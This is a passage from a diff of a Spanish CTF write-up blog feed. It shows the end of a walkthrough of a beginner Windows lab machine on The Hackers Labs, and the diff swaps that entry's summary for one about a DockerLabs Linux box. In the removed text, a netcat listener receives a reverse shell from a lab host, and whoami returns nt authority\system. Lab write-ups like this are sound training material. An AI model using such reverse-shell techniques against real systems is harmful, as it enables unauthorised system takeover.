-
-C:<span class="se">\U</span>sers<span class="se">\h</span>acker<span class="se">\D</span>ownloads&gt;
-
-</code></pre></div></div>
-
-<p>Y obtenemos la shell como <code class="language-plaintext highlighter-rouge">nt authority\system</code></p>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nc <span class="nt">-nlvp</span> 8889
-listening on <span class="o">[</span>any] 8889 ...
-connect to <span class="o">[</span>10.0.2.5] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.0.2.141] 49171
-Microsoft Windows <span class="o">[</span>Versi�n 6.3.9600]
-<span class="o">(</span>c<span class="o">)</span> 2013 Microsoft Corporation. Todos los derechos reservados.
-
-C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;whoami 
-<span class="nb">whoami
-</span>nt authority<span class="se">\s</span>ystem
-
-C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;
-</code></pre></div></div>]]></content><author><name>murrusko</name><email>murrusko@proton.me</email></author><category term="thl" /><category term="ctf" /><category term="windows" /><category term="principiante" /><summary type="html"><![CDATA[Estamos ante una máquina Windows de nivel principiante creada por CuriosidadesDeHackers y condor de la plataforma The Hackers Labs.]]></summary></entry></feed>
+</code></pre></div></div>]]></content><author><name>murrusko</name><email>murrusko@proton.me</email></author><category term="dockerlabs" /><category term="ctf" /><category term="linux" /><category term="medio" /><summary type="html"><![CDATA[Estamos ante un docker que contiene una distribución Linux. Es de nivel medio y es de la plataforma dockerlabs.]]></summary></entry></feed>
